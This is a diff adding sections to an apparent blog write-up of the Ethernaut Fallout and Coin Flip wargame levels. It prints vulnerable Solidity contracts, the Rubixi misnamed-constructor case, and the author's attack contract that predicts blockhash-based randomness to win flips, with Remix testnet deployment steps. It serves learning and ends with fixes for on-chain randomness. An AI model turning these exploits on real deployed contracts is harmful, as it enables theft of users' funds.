@@ -168,3 +168,193 @@ which worked! And since the fallback function makes anyone who send ether throug
 ![](https://i.imgur.com/Mu5HqrD.png)
 
 I was still a little shakey on the concepts. So I went ahead and created a new Instance of the level to try what works and what doesn't. Send() just takes the value as is and sendTransaction({value:abc}) uses this format.
+
+# Fallout
+
+This challenge was easier than the first level (I solved it in first 5 minutes easy) but taught a good lesson. Lets see the code first.
+
+{%highlight text%}
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import '@openzeppelin/contracts/math/SafeMath.sol';
+
+contract Fallout {
+  
+  using SafeMath for uint256;
+  mapping (address => uint) allocations;
+  address payable public owner;
+
+
+  /* constructor */
+  function Fal1out() public payable {
+    owner = msg.sender;
+    allocations[owner] = msg.value;
+  }
+
+  modifier onlyOwner {
+	        require(
+	            msg.sender == owner,
+	            "caller is not the owner"
+	        );
+	        _;
+	    }
+
+  function allocate() public payable {
+    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
+  }
+
+  function sendAllocation(address payable allocator) public {
+    require(allocations[allocator] > 0);
+    allocator.transfer(allocations[allocator]);
+  }
+
+  function collectAllocations() public onlyOwner {
+    msg.sender.transfer(address(this).balance);
+  }
+
+  function allocatorBalance(address allocator) public view returns (uint) {
+    return allocations[allocator];
+  }
+}
+{%endhighlight%}
+
+Just looking at the constructor should give you the answer. It is spelled "Fal1out" instead of "Fallout". Which means its not really a constructor but just another function. And we can call it to send ether and become the owner.
+
+![](https://i.imgur.com/x3Tjabv.png)
+
+After solving the challenge we get a case study of company named "Dynamic Pyramid" which renamed itself to "Rubixi". What they forgot to do was rename the constructor name and a hacker called the old constructor to become the owner of the contract.
+
+{%highlight text%}
+contract Rubixi {
+  address private owner;
+  function DynamicPyramid() { owner = msg.sender; }
+  function collectAllFees() { owner.transfer(this.balance) }
+{%endhighlight%}
+
+# Coin Flip
+
+It's day four on my own on this island of despair. I don't know how long I will last dealing with this frustration of not knowing anything about solidity.
+
+Sorry about that. I'm just tired. This challenge was particularly challening. We needed to create a smart contract of our own to attack the given smart contract. So There were two challenges:
+
+1. I don't know how to make smart contracts.
+2. I don't know solidity.
+3. I don't know how to make it interact with other contracts.
+
+Anyway.. lets start with the source code.
+
+{%highlight text%}
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import '@openzeppelin/contracts/math/SafeMath.sol';
+
+contract CoinFlip {
+
+  using SafeMath for uint256;
+  uint256 public consecutiveWins;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  constructor() public {
+    consecutiveWins = 0;
+  }
+
+  function flip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = blockValue.div(FACTOR);
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
+}
+{%endhighlight%}
+
+The first thing came to my mind was straight up brute force. From the looks of this code we needed to guess the output of coin flipping game. 10 TIMES IN A ROW! I whipped up a python script to see how long it will take. Just for fun:
+
+{%highlight text%}
+import random
+consec=0
+
+while consec!=10:
+  if random.randint(0,1)==1:
+    consec+=1
+  else:
+    consec=0
+{%endhighlight%}
+
+It took 2 seconds to get 10 True(s). I thought, maybe that is what we need to do. The hint recommended to use Remix IDE which is just an awesome online IDE to write smart contracts and deploy them. So I started out by writing (trying to anyway) some solidity code to make unlimited calls to flip() function till we get 10 consecutive wins. 
+
+It didn't work. (Thank god for that)
+
+I tried looking at the source code again and searched what each line and function did. For ex blockhash gives us the hash of the block and block.number gives us the number of last block in the chain.
+
+This revealed another (more sane) attack vector. Since all the information to generate the random number is public, we can predict the value and make correct choices in life! (yay!)
+
+I read docs, I saw youtube videos, I tried and errored badly while implementing this idea. My idea was to copy the flip function random number generator and predict the side of coin. Since I didn't know jack about solidity I wasn't able to. 
+
+Side note: you can use multiple ways to import a file into solidity. I tried to import the SafeMath.sol file which was originally used in the source code. for ex `import './SafeMath.sol';` , `import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";`
+
+Finally I gave in. I knew what I had to do but didn't know how to do it. I read some writeups. 
+
+I got to know that to interact with other smart contracts there are three ways:
+1. If a contract is in same file we can just make an object for it in the second contract.
+2. We can import contracts from files stored in same place.
+3. We create an interface with the list of functions of the contract and then make an object for that contract to use. (we use this)
+
+My code:
+
+{%highlight text%}
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.5.0;
+
+interface CoinFlip{
+    function flip(bool _guess) external returns (bool);
+}
+
+contract onedone  {
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    CoinFlip public object=CoinFlip(<Contract address here>);
+
+    function getsecret() public returns(bool){
+        uint256 blockValue = uint256(blockhash(block.number-1));
+        uint256 coinFlip= blockValue/FACTOR;
+        bool result = coinFlip == 1 ? true : false;
+        bool plswork = object.flip(result);
+        return plswork;
+    }
+}
+
+{%endhighlight%}
+(I got a bit desparate at the end to make it work., hence the naming conventions)
+
+Now after we do this, We compile it and then click on deploy from the left side menu. Select Environment as "injected web3" so that we can work on actual test net instead of the default local blockchain. Select the contract you want to deploy from dropdown and hit deploy. 
+
+Once deployed The functions we made in our contract will become buttons and input fields with which we can interact. 
+
+![](https://i.imgur.com/TBGieBZ.png)
+
+Now when we click on getsecret it will make a call to flip function with correct predictions. You may face some errors while doing this.
+
+![](https://i.imgur.com/2CqhSB2.png)
+
+![](https://i.imgur.com/aDliypm.png)
+
+Just remember to do it real slow. We have to call this button 10 times to clear the level. Slowly but surely it will work.
+
+![](https://i.imgur.com/7KKE7pI.png)
+
+The lesson in this challenge was that , there isn't any native way to produce true random numbers in solidity yet, because all the data and variables are visible to everyone. The author recommends  Chainlink VRF, Bitcoin block headers (verified through BTC Relay), RANDAO, or Oraclize to generate random numbers.
